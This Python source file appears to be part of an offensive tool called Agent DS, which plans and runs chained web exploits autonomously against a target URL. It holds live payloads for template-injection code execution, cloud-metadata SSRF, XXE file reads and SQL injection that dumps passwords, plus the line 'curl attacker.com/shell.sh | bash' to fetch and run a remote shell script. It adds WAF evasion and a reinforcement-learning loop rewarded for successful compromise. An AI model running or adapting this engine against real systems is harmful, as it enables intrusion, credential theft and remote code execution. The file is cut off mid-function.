"""
Agent DS - Chained Exploit Engine
AI-powered system for intelligent exploit chaining and multi-stage attack orchestration
"""

import asyncio
import json
import time
import random
import numpy as np
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import logging
from collections import defaultdict, deque

from core.config.settings import Config
from core.utils.logger import get_logger
from core.ai_learning.reinforcement_engine import ReinforcementLearningEngine
from core.ai_learning.underrated_attacks import UnderratedAttackOrchestrator, AttackResult
from core.ai_learning.payload_mutation import PayloadMutationEngine

logger = get_logger('chained_exploit_engine')

class ChainType(Enum):
    """Types of exploit chains"""
    RECONNAISSANCE = "reconnaissance"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXFILTRATION = "data_exfiltration"
    PERSISTENCE = "persistence"
    EVASION = "evasion"

class ExploitNode(Enum):
    """Individual exploit types that can be chained"""
    # Information Gathering
    SUBDOMAIN_ENUM = "subdomain_enumeration"
    PORT_SCAN = "port_scanning"
    SERVICE_DETECTION = "service_detection"
    
    # Initial Access
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    SSTI = "ssti"
    XXE = "xxe"
    SSRF = "ssrf"
    FILE_INCLUSION = "file_inclusion"
    COMMAND_INJECTION = "command_injection"
    
    # Post-Exploitation
    FILE_UPLOAD = "file_upload"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXTRACTION = "data_extraction"
    
    # Advanced Techniques
    DESERIALIZATION = "deserialization"
    CACHE_POISONING = "cache_poisoning"
    REQUEST_SMUGGLING = "request_smuggling"
    BUSINESS_LOGIC = "business_logic"

@dataclass
class ExploitChainNode:
    """Individual node in an exploit chain"""
    exploit_type: ExploitNode
    payload: str
    target_info: Dict[str, Any]
    success_probability: float
    execution_time: float
    dependencies: List[ExploitNode] = field(default_factory=list)
    prerequisites: Dict[str, Any] = field(default_factory=dict)
    output_data: Dict[str, Any] = field(default_factory=dict)
    success: bool = False
    error_message: str = ""

@dataclass
class ExploitChain:
    """Complete exploit chain definition"""
    chain_id: str
    chain_type: ChainType
    nodes: List[ExploitChainNode]
    success_rate: float
    total_impact: float
    execution_time: float
    complexity_score: float
    stealth_score: float
    created_at: datetime = field(default_factory=datetime.now)

class ChainKnowledgeBase:
    """Knowledge base of effective exploit chains"""
    
    def __init__(self):
        self.logger = get_logger('chain_knowledge')
        self.known_chains = {}
        self.chain_effectiveness = defaultdict(float)
        self.success_patterns = defaultdict(list)
        
        # Pre-defined high-value exploit chains
        self._initialize_expert_chains()
    
    def _initialize_expert_chains(self):
        """Initialize expert-defined exploit chains"""
        
        # SSTI → RCE Chain
        ssti_rce_chain = [
            ExploitChainNode(
                exploit_type=ExploitNode.SSTI,
                payload="{{7*7}}",
                target_info={"parameter": "template", "engine": "auto"},
                success_probability=0.7,
                execution_time=2.0
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.COMMAND_INJECTION,
                payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                target_info={"method": "template_rce"},
                success_probability=0.8,
                execution_time=3.0,
                dependencies=[ExploitNode.SSTI]
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.FILE_UPLOAD,
                payload="reverse_shell.php",
                target_info={"upload_method": "template_write"},
                success_probability=0.6,
                execution_time=5.0,
                dependencies=[ExploitNode.COMMAND_INJECTION]
            )
        ]
        
        # SSRF → RCE Chain
        ssrf_rce_chain = [
            ExploitChainNode(
                exploit_type=ExploitNode.SSRF,
                payload="http://169.254.169.254/latest/meta-data/",
                target_info={"target": "aws_metadata"},
                success_probability=0.6,
                execution_time=2.0
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.FILE_INCLUSION,
                payload="file:///etc/passwd",
                target_info={"method": "ssrf_file_read"},
                success_probability=0.7,
                execution_time=3.0,
                dependencies=[ExploitNode.SSRF]
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.COMMAND_INJECTION,
                payload="curl attacker.com/shell.sh | bash",
                target_info={"method": "ssrf_command_exec"},
                success_probability=0.5,
                execution_time=4.0,
                dependencies=[ExploitNode.FILE_INCLUSION]
            )
        ]
        
        # XXE → SSRF → Internal Access Chain
        xxe_internal_chain = [
            ExploitChainNode(
                exploit_type=ExploitNode.XXE,
                payload='<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                target_info={"file_target": "/etc/passwd"},
                success_probability=0.8,
                execution_time=2.0
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.SSRF,
                payload='<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]>',
                target_info={"internal_target": "localhost:8080"},
                success_probability=0.6,
                execution_time=3.0,
                dependencies=[ExploitNode.XXE]
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.PRIVILEGE_ESCALATION,
                payload="admin_panel_exploit",
                target_info={"target": "internal_admin"},
                success_probability=0.4,
                execution_time=5.0,
                dependencies=[ExploitNode.SSRF]
            )
        ]
        
        # SQL Injection → Data Extraction → Lateral Movement
        sqli_lateral_chain = [
            ExploitChainNode(
                exploit_type=ExploitNode.SQL_INJECTION,
                payload="' UNION SELECT user(),database(),version()-- ",
                target_info={"injection_point": "id_parameter"},
                success_probability=0.7,
                execution_time=2.0
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.DATA_EXTRACTION,
                payload="' UNION SELECT username,password FROM users-- ",
                target_info={"table": "users"},
                success_probability=0.8,
                execution_time=4.0,
                dependencies=[ExploitNode.SQL_INJECTION]
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.LATERAL_MOVEMENT,
                payload="credential_reuse_attack",
                target_info={"method": "password_spray"},
                success_probability=0.5,
                execution_time=10.0,
                dependencies=[ExploitNode.DATA_EXTRACTION]
            )
        ]
        
        # Business Logic → Privilege Escalation Chain
        business_logic_chain = [
            ExploitChainNode(
                exploit_type=ExploitNode.BUSINESS_LOGIC,
                payload="price=-100",
                target_info={"attack": "price_manipulation"},
                success_probability=0.6,
                execution_time=1.0
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.BUSINESS_LOGIC,
                payload="direct_step_access",
                target_info={"attack": "workflow_bypass"},
                success_probability=0.7,
                execution_time=2.0,
                dependencies=[ExploitNode.BUSINESS_LOGIC]
            ),
            ExploitChainNode(
                exploit_type=ExploitNode.PRIVILEGE_ESCALATION,
                payload="admin_function_access",
                target_info={"method": "business_logic_escalation"},
                success_probability=0.4,
                execution_time=3.0,
                dependencies=[ExploitNode.BUSINESS_LOGIC]
            )
        ]
        
        # Store chains in knowledge base
        self.known_chains = {
            "ssti_to_rce": ExploitChain(
                chain_id="ssti_to_rce",
                chain_type=ChainType.PRIVILEGE_ESCALATION,
                nodes=ssti_rce_chain,
                success_rate=0.7,
                total_impact=8.5,
                execution_time=10.0,
                complexity_score=7.0,
                stealth_score=6.0
            ),
            "ssrf_to_rce": ExploitChain(
                chain_id="ssrf_to_rce",
                chain_type=ChainType.LATERAL_MOVEMENT,
                nodes=ssrf_rce_chain,
                success_rate=0.6,
                total_impact=7.5,
                execution_time=9.0,
                complexity_score=6.5,
                stealth_score=7.0
            ),
            "xxe_to_internal": ExploitChain(
                chain_id="xxe_to_internal",
                chain_type=ChainType.LATERAL_MOVEMENT,
                nodes=xxe_internal_chain,
                success_rate=0.5,
                total_impact=7.0,
                execution_time=10.0,
                complexity_score=8.0,
                stealth_score=8.0
            ),
            "sqli_to_lateral": ExploitChain(
                chain_id="sqli_to_lateral",
                chain_type=ChainType.DATA_EXFILTRATION,
                nodes=sqli_lateral_chain,
                success_rate=0.6,
                total_impact=8.0,
                execution_time=16.0,
                complexity_score=6.0,
                stealth_score=5.0
            ),
            "business_logic_escalation": ExploitChain(
                chain_id="business_logic_escalation",
                chain_type=ChainType.PRIVILEGE_ESCALATION,
                nodes=business_logic_chain,
                success_rate=0.5,
                total_impact=6.5,
                execution_time=6.0,
                complexity_score=5.0,
                stealth_score=9.0
            )
        }
    
    def get_chains_by_type(self, chain_type: ChainType) -> List[ExploitChain]:
        """Get all chains of a specific type"""
        return [chain for chain in self.known_chains.values() 
                if chain.chain_type == chain_type]
    
    def get_chains_containing_node(self, node_type: ExploitNode) -> List[ExploitChain]:
        """Get all chains containing a specific exploit node"""
        matching_chains = []
        for chain in self.known_chains.values():
            if any(node.exploit_type == node_type for node in chain.nodes):
                matching_chains.append(chain)
        return matching_chains
    
    def update_chain_effectiveness(self, chain_id: str, success: bool, execution_time: float):
        """Update effectiveness metrics for a chain"""
        if success:
            self.chain_effectiveness[chain_id] += 0.1
        else:
            self.chain_effectiveness[chain_id] -= 0.05
        
        # Clamp values
        self.chain_effectiveness[chain_id] = max(0.0, min(1.0, self.chain_effectiveness[chain_id]))

class ChainPlanningAI:
    """AI system for planning optimal exploit chains"""
    
    def __init__(self, knowledge_base: ChainKnowledgeBase):
        self.logger = get_logger('chain_planning_ai')
        self.knowledge_base = knowledge_base
        self.rl_engine = ReinforcementLearningEngine()
        
        # Chain planning parameters
        self.max_chain_length = 8
        self.min_success_probability = 0.3
        self.exploration_rate = 0.2
    
    async def plan_optimal_chain(self, target_info: Dict[str, Any], 
                               objective: ChainType) -> Optional[ExploitChain]:
        """Plan optimal exploit chain for given target and objective"""
        try:
            self.logger.info(f"Planning exploit chain for objective: {objective.value}")
            
            # Get candidate chains for objective
            candidate_chains = self.knowledge_base.get_chains_by_type(objective)
            
            if not candidate_chains:
                # Generate new chain using AI
                return await self._generate_new_chain(target_info, objective)
            
            # Score chains based on target characteristics
            scored_chains = []
            for chain in candidate_chains:
                score = await self._score_chain_for_target(chain, target_info)
                scored_chains.append((chain, score))
            
            # Select best chain
            best_chain, best_score = max(scored_chains, key=lambda x: x[1])
            
            # Adapt chain for specific target
            adapted_chain = await self._adapt_chain_for_target(best_chain, target_info)
            
            self.logger.info(f"Selected chain '{adapted_chain.chain_id}' with score {best_score:.2f}")
            return adapted_chain
            
        except Exception as e:
            self.logger.error(f"Chain planning failed: {str(e)}")
            return None
    
    async def _score_chain_for_target(self, chain: ExploitChain, 
                                    target_info: Dict[str, Any]) -> float:
        """Score a chain's suitability for a target"""
        base_score = chain.success_rate
        
        # Technology stack compatibility
        tech_stack = target_info.get('technology_stack', [])
        tech_bonus = 0.0
        
        for node in chain.nodes:
            if node.exploit_type == ExploitNode.SSTI and 'python' in tech_stack:
                tech_bonus += 0.2
            elif node.exploit_type == ExploitNode.XXE and 'java' in tech_stack:
                tech_bonus += 0.2
            elif node.exploit_type == ExploitNode.SQL_INJECTION and 'database' in tech_stack:
                tech_bonus += 0.15
        
        # Security measures penalty
        security_measures = target_info.get('security_measures', [])
        security_penalty = 0.0
        
        if 'waf' in security_measures:
            security_penalty += 0.1
        if 'ids' in security_measures:
            security_penalty += 0.05
        if 'sandboxing' in security_measures:
            security_penalty += 0.15
        
        # Time constraints
        max_time = target_info.get('max_execution_time', 300)
        time_penalty = max(0, (chain.execution_time - max_time) / max_time * 0.2)
        
        # Historical effectiveness
        historical_bonus = self.knowledge_base.chain_effectiveness.get(chain.chain_id, 0.0) * 0.1
        
        final_score = base_score + tech_bonus - security_penalty - time_penalty + historical_bonus
        return max(0.0, min(1.0, final_score))
    
    async def _adapt_chain_for_target(self, chain: ExploitChain, 
                                    target_info: Dict[str, Any]) -> ExploitChain:
        """Adapt a chain for specific target characteristics"""
        adapted_nodes = []
        
        for node in chain.nodes:
            adapted_node = ExploitChainNode(
                exploit_type=node.exploit_type,
                payload=node.payload,
                target_info={**node.target_info, **target_info},
                success_probability=node.success_probability,
                execution_time=node.execution_time,
                dependencies=node.dependencies.copy(),
                prerequisites=node.prerequisites.copy()
            )
            
            # Adapt payload based on target characteristics
            if 'waf_present' in target_info and target_info['waf_present']:
                adapted_node.payload = await self._apply_waf_evasion(adapted_node.payload)
                adapted_node.success_probability *= 0.8  # Reduce success probability
            
            adapted_nodes.append(adapted_node)
        
        # Create adapted chain
        adapted_chain = ExploitChain(
            chain_id=f"{chain.chain_id}_adapted_{int(time.time())}",
            chain_type=chain.chain_type,
            nodes=adapted_nodes,
            success_rate=chain.success_rate * 0.9,  # Slightly lower due to adaptation uncertainty
            total_impact=chain.total_impact,
            execution_time=chain.execution_time * 1.1,  # Slightly longer due to evasion
            complexity_score=chain.complexity_score + 1.0,  # More complex due to adaptation
            stealth_score=chain.stealth_score + 0.5  # Better stealth due to evasion
        )
        
        return adapted_chain
    
    async def _generate_new_chain(self, target_info: Dict[str, Any], 
                                objective: ChainType) -> Optional[ExploitChain]:
        """Generate new exploit chain using AI"""
        try:
            # Use reinforcement learning to generate chain
            state = self._encode_target_state(target_info, objective)
            
            chain_nodes = []
            current_state = state
            
            for step in range(self.max_chain_length):
                # Get action from RL agent
                action = self.rl_engine.select_action(current_state)
                
                # Convert action to exploit node
                exploit_node = self._action_to_exploit_node(action)
                if not exploit_node:
                    break
                
                # Create chain node
                node = await self._create_chain_node(exploit_node, target_info, chain_nodes)
                chain_nodes.append(node)
                
                # Update state
                current_state = self._update_state_after_action(current_state, action)
                
                # Check if objective is achieved
                if self._is_objective_achieved(chain_nodes, objective):
                    break
            
            if not chain_nodes:
                return None
            
            # Create new chain
            new_chain = ExploitChain(
                chain_id=f"ai_generated_{int(time.time())}",
                chain_type=objective,
                nodes=chain_nodes,
                success_rate=self._calculate_chain_success_rate(chain_nodes),
                total_impact=self._calculate_total_impact(chain_nodes),
                execution_time=sum(node.execution_time for node in chain_nodes),
                complexity_score=len(chain_nodes) * 1.5,
                stealth_score=5.0  # Default stealth score
            )
            
            return new_chain
            
        except Exception as e:
            self.logger.error(f"New chain generation failed: {str(e)}")
            return None
    
    def _encode_target_state(self, target_info: Dict[str, Any], objective: ChainType) -> np.ndarray:
        """Encode target information into state vector"""
        # Create feature vector from target info
        features = []
        
        # Technology stack features
        tech_stack = target_info.get('technology_stack', [])
        features.extend([
            1.0 if 'python' in tech_stack else 0.0,
            1.0 if 'java' in tech_stack else 0.0,
            1.0 if 'php' in tech_stack else 0.0,
            1.0 if 'nodejs' in tech_stack else 0.0,
            1.0 if 'database' in tech_stack else 0.0
        ])
        
        # Security measures
        security_measures = target_info.get('security_measures', [])
        features.extend([
            1.0 if 'waf' in security_measures else 0.0,
            1.0 if 'ids' in security_measures else 0.0,
            1.0 if 'sandboxing' in security_measures else 0.0
        ])
        
        # Objective encoding
        objective_features = [0.0] * len(ChainType)
        objective_features[list(ChainType).index(objective)] = 1.0
        features.extend(objective_features)
        
        # Pad to fixed size
        while len(features) < 20:
            features.append(0.0)
        
        return np.array(features[:20], dtype=np.float32)
    
    async def _apply_waf_evasion(self, payload: str) -> str:
        """Apply WAF evasion techniques to payload"""
        mutation_engine = PayloadMutationEngine()
        return await mutation_engine.generate_mutated_payload(
            "generic", payload, {'waf_detected': True}
        )
    
    def _action_to_exploit_node(self, action: int) -> Optional[ExploitNode]:
        """Convert RL action to exploit node"""
        exploit_nodes = list(ExploitNode)
        if 0 <= action < len(exploit_nodes):
            return exploit_nodes[action]
        return None
    
    async def _create_chain_node(self, exploit_type: ExploitNode, 
                               target_info: Dict[str, Any], 
                               existing_nodes: List[ExploitChainNode]) -> ExploitChainNode:
        """Create a chain node for the exploit type"""
        # Generate appropriate payload for exploit type
        payload = self._generate_payload_for_exploit(exploit_type)
        
        # Calculate dependencies
        dependencies = self._calculate_dependencies(exploit_type, existing_nodes)
        
        # Calculate success probability based on context
        success_prob = self._calculate_success_probability(exploit_type, target_info, existing_nodes)
        
        return ExploitChainNode(
            exploit_type=exploit_type,
            payload=payload,
            target_info=target_info,
            success_probability=success_prob,
            execution_time=random.uniform(1.0, 5.0),
            dependencies=dependencies
        )
    
    def _generate_payload_for_exploit(self, exploit_type: ExploitNode) -> str:
        """Generate basic payload for exploit type"""
        payload_templates = {
            ExploitNode.SQL_INJECTION: "' UNION SELECT 1,2,3-- ",
            ExploitNode.XSS: "<script>alert('xss')</script>",
            ExploitNode.SSTI: "{{7*7}}",
            ExploitNode.XXE: '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            ExploitNode.SSRF: "http://169.254.169.254/latest/meta-data/",
            ExploitNode.COMMAND_INJECTION: "; id #",
            ExploitNode.FILE_INCLUSION: "../../../etc/passwd",
        }
        
        return payload_templates.get(exploit_type, "generic_payload")
    
    def _calculate_dependencies(self, exploit_type: ExploitNode, 
                              existing_nodes: List[ExploitChainNode]) -> List[ExploitNode]:
        """Calculate dependencies for exploit type"""
        dependency_rules = {
            ExploitNode.COMMAND_INJECTION: [ExploitNode.SSTI, ExploitNode.SQL_INJECTION],
            ExploitNode.FILE_UPLOAD: [ExploitNode.COMMAND_INJECTION],
            ExploitNode.PRIVILEGE_ESCALATION: [ExploitNode.COMMAND_INJECTION, ExploitNode.FILE_UPLOAD],
            ExploitNode.LATERAL_MOVEMENT: [ExploitNode.PRIVILEGE_ESCALATION, ExploitNode.DATA_EXTRACTION],
        }
        
        possible_deps = dependency_rules.get(exploit_type, [])
        existing_types = [node.exploit_type for node in existing_nodes]
        
        return [dep for dep in possible_deps if dep in existing_types]
    
    def _calculate_success_probability(self, exploit_type: ExploitNode, 
                                     target_info: Dict[str, Any],
                                     existing_nodes: List[ExploitChainNode]) -> float:
        """Calculate success probability for exploit in context"""
        base_probabilities = {
            ExploitNode.SQL_INJECTION: 0.7,
            ExploitNode.XSS: 0.8,
            ExploitNode.SSTI: 0.6,
            ExploitNode.XXE: 0.5,
            ExploitNode.SSRF: 0.6,
            ExploitNode.COMMAND_INJECTION: 0.4,
            ExploitNode.FILE_UPLOAD: 0.3,
            ExploitNode.PRIVILEGE_ESCALATION: 0.2,
        }
        
        base_prob = base_probabilities.get(exploit_type, 0.5)
        
        # Adjust based on security measures
        security_measures = target_info.get('security_measures', [])
        if 'waf' in security_measures:
            base_prob *= 0.7
        if 'ids' in security_measures:
            base_prob *= 0.8
        
        # Boost probability if dependencies are satisfied
        dependencies = self._calculate_dependencies(exploit_type, existing_nodes)
        if dependencies:
            satisfied_deps = sum(1 for dep in dependencies 
                               if any(node.exploit_type == dep and node.success 
                                     for node in existing_nodes))
            boost = satisfied_deps / len(dependencies) * 0.3
            base_prob += boost
        
        return min(1.0, base_prob)
    
    def _update_state_after_action(self, state: np.ndarray, action: int) -> np.ndarray:
        """Update state after taking an action"""
        # Simple state update - in practice this would be more sophisticated
        new_state = state.copy()
        new_state[-1] = action / 100.0  # Add action information
        return new_state
    
    def _is_objective_achieved(self, chain_nodes: List[ExploitChainNode], 
                             objective: ChainType) -> bool:
        """Check if the objective has been achieved"""
        objective_requirements = {
            ChainType.RECONNAISSANCE: [ExploitNode.SUBDOMAIN_ENUM, ExploitNode.PORT_SCAN],
            ChainType.PRIVILEGE_ESCALATION: [ExploitNode.PRIVILEGE_ESCALATION],
            ChainType.LATERAL_MOVEMENT: [ExploitNode.LATERAL_MOVEMENT],
            ChainType.DATA_EXFILTRATION: [ExploitNode.DATA_EXTRACTION],
        }
        
        required_nodes = objective_requirements.get(objective, [])
        chain_node_types = [node.exploit_type for node in chain_nodes]
        
        return any(req_node in chain_node_types for req_node in required_nodes)
    
    def _calculate_chain_success_rate(self, chain_nodes: List[ExploitChainNode]) -> float:
        """Calculate overall success rate for chain"""
        if not chain_nodes:
            return 0.0
        
        # Simple calculation - product of individual probabilities
        total_prob = 1.0
        for node in chain_nodes:
            total_prob *= node.success_probability
        
        return total_prob
    
    def _calculate_total_impact(self, chain_nodes: List[ExploitChainNode]) -> float:
        """Calculate total impact score for chain"""
        impact_scores = {
            ExploitNode.SQL_INJECTION: 7.0,
            ExploitNode.COMMAND_INJECTION: 9.0,
            ExploitNode.PRIVILEGE_ESCALATION: 9.5,
            ExploitNode.LATERAL_MOVEMENT: 8.5,
            ExploitNode.DATA_EXTRACTION: 8.0,
        }
        
        total_impact = sum(impact_scores.get(node.exploit_type, 5.0) for node in chain_nodes)
        return min(10.0, total_impact)

class ChainExecutionEngine:
    """Engine for executing exploit chains"""
    
    def __init__(self, knowledge_base: ChainKnowledgeBase):
        self.logger = get_logger('chain_execution')
        self.knowledge_base = knowledge_base
        self.attack_orchestrator = UnderratedAttackOrchestrator()
        
        # Execution parameters
        self.max_execution_time = 300  # 5 minutes
        self.retry_attempts = 2
        self.failure_threshold = 0.5
    
    async def execute_chain(self, chain: ExploitChain, target_url: str) -> Dict[str, Any]:
        """Execute an exploit chain against a target"""
        execution_start = time.time()
        results = {
            'chain_id': chain.chain_id,
            'target_url': target_url,
            'start_time': datetime.now().isoformat(),
            'nodes_executed': [],
            'overall_success': False,
            'execution_time': 0.0,
            'impact_achieved': 0.0,
            'errors': []
        }
        
        try:
            self.logger.info(f"Executing exploit chain '{chain.chain_id}' against {target_url}")
            
            # Execute nodes in sequence
            for i, node in enumerate(chain.nodes):
                if time.time() - execution_start > self.max_execution_time:
                    results['errors'].append("Execution timeout reached")
                    break
                
                # Check dependencies
                if not self._check_dependencies(node, results['nodes_executed']):
                    self.logger.warning(f"Dependencies not satisfied for node {i}")
                    node.success = False
                    node.error_message = "Dependencies not satisfied"
                    results['nodes_executed'].append(self._node_to_dict(node))
                    continue
                
                # Execute node
                node_result = await self._execute_node(node, target_url)
                results['nodes_executed'].append(node_result)
                
                # Update node success status
                node.success = node_result['success']
                node.error_message = node_result.get('error_message', '')
                
                # Early termination on critical failure
                if not node.success and node.exploit_type in [
                    ExploitNode.SSTI, ExploitNode.SQL_INJECTION, ExploitNode.XXE
                ]:
                    failure_rate = sum(1 for n in results['nodes_executed'] if not n['success']) / len(results['nodes_executed'])
                    if failure_rate > self.failure_threshold:
                        self.logger.warning("High failure rate detected, terminating chain execution")
                        break
            
            # Calculate final results
            results['execution_time'] = time.time() - execution_start
            results['overall_success'] = self._calculate_overall_success(results['nodes_executed'])
            results['impact_achieved'] = self._calculate_impact_achieved(results['nodes_executed'])
            results['end_time'] = datetime.now().isoformat()
            
            # Update knowledge base
            self.knowledge_base.update_chain_effectiveness(
                chain.chain_id, results['overall_success'], results['execution_time']
            )
            
            self.logger.info(f"Chain execution completed: {results['overall_success']}")
            
        except Exception as e:
            self.logger.error(f"Chain execution failed: {str(e)}")
            results['errors'].append(str(e))
        
        return results
    
    def _check_dependencies(self, node: ExploitChainNode, 
                          executed_nodes: List[Dict[str, Any]]) -> bool:
        """Check if node dependencies are satisfied"""
        if not node.dependencies:
            return True
        
        executed_types = [n['exploit_type'] for n in executed_nodes if n['success']]
        return all(dep.value in executed_types for dep in node.dependencies)
    
    async def _execute_node(self, node: ExploitChainNode, target_url: str) -> Dict[str, Any]:
        """Execute a single node in the chain"""
        node_start = time.time()
        
        try:
            self.logger.info(f"Executing node: {node.exploit_type.value}")
            
            # Route to appropriate attack module
            if node.exploit_type == ExploitNode.SSTI:
                result = await self.attack_orchestrator.ssti_module.exploit_ssti(
                    target_url, node.target_info.get('parameter', 'template'), 'id'
                )
            elif node.exploit_type == ExploitNode.XXE:
                result = await self.attack_orchestrator.xxe_module.exploit_xxe_file_read(target_url)
            elif node.exploit_type == ExploitNode.SSRF:
                result = await self.attack_orchestrator.xxe_module.exploit_xxe_ssrf(target_url)
            elif node.exploit_type in [ExploitNode.BUSINESS_LOGIC]:
                results = await self.attack_orchestrator.execute_comprehensive_scan(
                    target_url, ['business_logic']
                )
                result = list(results.values())[0] if results else None
            else:
                # Mock execution for other node types
                result = self._mock_node_execution(node)
            
            if result:
                return {
                    'exploit_type': node.exploit_type.value,
                    'success': result.success,
                    'execution_time': time.time() - node_start,
                    'payload_used': result.payload_used,
                    'impact_level': result.impact_level,
                    'vulnerability_details': result.vulnerability_details,
                    'error_message': '' if result.success else 'Exploit failed'
                }
            else:
                return {
                    'exploit_type': node.exploit_type.value,
                    'success': False,
                    'execution_time': time.time() - node_start,
                    'payload_used': node.payload,
                    'impact_level': 'none',
                    'vulnerability_details': {},
                    'error_message': 'No attack module available'
                }
                
        except Exception as e:
            self.logger.error(f"Node execution failed: {str(e)}")
            return {
                'exploit_type': node.exploit_type.value,
                'success': False,
                'execution_time': time.time() - node_start,
                'payload_used': node.payload,
                'impact_level': 'none',
                'vulnerability_details': {},
                'error_message': str(e)
            }
    
    def _mock_node_execution(self, node: ExploitChainNode) -> AttackResult:
        """Mock execution for node types without implemented modules"""
        # Simulate success based on node's success probability
        success = random.random() < node.success_probability
        
        return AttackResult(
            attack_type=node.exploit_type.value,
            success=success,
            vulnerability_details={'simulated': True},
            payload_used=node.payload,
            response_data="Mock response data",
            impact_level="medium" if success else "none",
            remediation_info="Mock remediation info",
            technique_details={'mock': True}
        )
    
    def _node_to_dict(self, node: ExploitChainNode) -> Dict[str, Any]:
        """Convert node to dictionary representation"""
        return {
            'exploit_type': node.exploit_type.value,
            'success': node.success,
            'execution_time': node.execution_time,
            'payload_used': node.payload,
            'error_message': node.error_message
        }
    
    def _calculate_overall_success(self, executed_nodes: List[Dict[str, Any]]) -> bool:
        """Calculate overall chain success"""
        if not executed_nodes:
            return False
        
        success_count = sum(1 for node in executed_nodes if node['success'])
        success_rate = success_count / len(executed_nodes)
        
        # Chain is successful if > 50% of nodes succeed
        return success_rate > 0.5
    
    def _calculate_impact_achieved(self, executed_nodes: List[Dict[str, Any]]) -> float:
        """Calculate total impact achieved by chain"""
        impact_scores = {
            'critical': 10.0,
            'high': 7.5,
            'medium': 5.0,
            'low': 2.5,
            'none': 0.0
        }
        
        total_impact = 0.0
        for node in executed_nodes:
            if node['success']:
                impact_level = node.get('impact_level', 'none')
                total_impact += impact_scores.get(impact_level, 0.0)
        
        return total_impact

class ChainedExploitEngine:
    """Main orchestrator for chained exploit operations"""
    
    def __init__(self):
        self.logger = get_logger('chained_exploit_engine')
        
        # Initialize components
        self.knowledge_base = ChainKnowledgeBase()
        self.planning_ai = ChainPlanningAI(self.knowledge_base)
        self.execution_engine = ChainExecutionEngine(self.knowledge_base)
        
        # Statistics tracking
        self.execution_history = []
        self.success_patterns = defaultdict(list)
    
    async def execute_autonomous_attack(self, target_url: str, 
                                      objective: ChainType = ChainType.PRIVILEGE_ESCALATION,
                                      target_info: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute autonomous attack with optimal chain selection and execution"""
        
        if target_info is None:
            target_info = await self._gather_target_intelligence(target_url)
        
        try:
            self.logger.info(f"Starting autonomous attack against {target_url}")
            
            # Plan optimal exploit chain
            optimal_chain = await self.planning_ai.plan_optimal_chain(target_info, objective)
            
            if not optimal_chain:
                return {
                    'success': False,
                    'error': 'Failed to plan exploit chain',
                    'target_url': target_url,
                    'objective': objective.value
                }
            
            # Execute the chain
            execution_results = await self.execution_engine.execute_chain(optimal_chain, target_url)
            
            # Learn from results
            await self._learn_from_execution(optimal_chain, execution_results)
            
            # Store execution history
            self.execution_history.append({
                'timestamp': datetime.now().isoformat(),
                'target_url': target_url,
                'objective': objective.value,
                'chain_used': optimal_chain.chain_id,
                'results': execution_results
            })
            
            return {
                'success': execution_results['overall_success'],
                'chain_id': optimal_chain.chain_id,
                'execution_results': execution_results,
                'target_url': target_url,
                'objective': objective.value,
                'impact_achieved': execution_results['impact_achieved']
            }
            
        except Exception as e:
            self.logger.error(f"Autonomous attack failed: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'target_url': target_url,
                'objective': objective.value
            }
    
    async def _gather_target_intelligence(self, target_url: str) -> Dict[str, Any]:
        """Gather intelligence about the target"""
        # Mock intelligence gathering - would use actual reconnaissance tools
        intelligence = {
            'technology_stack': ['python', 'database'],
            'security_measures': ['waf'],
            'max_execution_time': 300,
            'waf_present': True,
            'server_info': 'nginx/1.18.0',
            'framework_detected': 'flask'
        }
        
        self.logger.info(f"Gathered target intelligence: {intelligence}")
        return intelligence
    
    async def _learn_from_execution(self, chain: ExploitChain, results: Dict[str, Any]):
        """Learn from chain execution results"""
        try:
            # Update reinforcement learning model
            state = self.planning_ai._encode_target_state(
                results.get('target_info', {}), chain.chain_type
            )
            
            # Calculate reward based on results
            reward = self._calculate_learning_reward(results)
            
            # Train RL model (simplified)
            await self.planning_ai.rl_engine.train_step(state, 0, reward, state, False)
            
            # Update success patterns
            if results['overall_success']:
                self.success_patterns[chain.chain_type.value].append({
                    'chain_id': chain.chain_id,
                    'execution_time': results['execution_time'],
                    'impact_achieved': results['impact_achieved']
                })
            
        except Exception as e:
            self.logger.error(f"Learning from execution failed: {str(e)}")
    
    def _calculate_learning_reward(self, results: Dict[str, Any]) -> float:
        """Calculate reward for reinforcement learning"""
        base_reward = 1.0 if results['overall_success'] else -0.5
        
        # Bonus for high impact
        impact_bonus = results.get('impact_achieved', 0.0) / 100.0
        
        # Penalty for long execution time
        time_penalty = max(0, (results.get('execution_time', 0) - 60) / 300.0)
        
        return base_reward + impact_bonus - time_penalty
    
    def get_execution_statistics(self) -> Dict[str, Any]:
        """Get statistics about chain executions"""
        if not self.execution_history:
            return {'total_executions': 0}
        
        total_executions = len(self.execution_history)
        successful_executions = sum(1 for exec in self.execution_history 
                                   if exec['results']['overall_success'])
        
        avg_execution_time = sum(exec['results']['execution_time'] 
                               for exec in self.execution_history) / total_executions
        
        avg_impact = sum(exec['results']['impact_achieved'] 
                        for exec in self.execution_history) / total_executions
        
        # Most successful objective
        objective_success = defaultdict(list)
        for exec in self.execution_history:
            objective_success[exec['objective']].append(exec['results']['overall_success'])
        
        best_objective = max(objective_success.items(), 
                           key=lambda x: sum(x[1]) / len(x[1]) if x[1] else 0)[0] if objective_success else None
        
        return {
            'total_executions': total_executions,
            'successful_executions': successful_executions,
            'success_rate': successful_executions / total_executions,
            'average_execution_time': avg_execution_time,
            'average_impact_achieved': avg_impact,
            'most_successful_objective': best_objective,
            'known_chains': len(self.knowledge_base.known_chains),
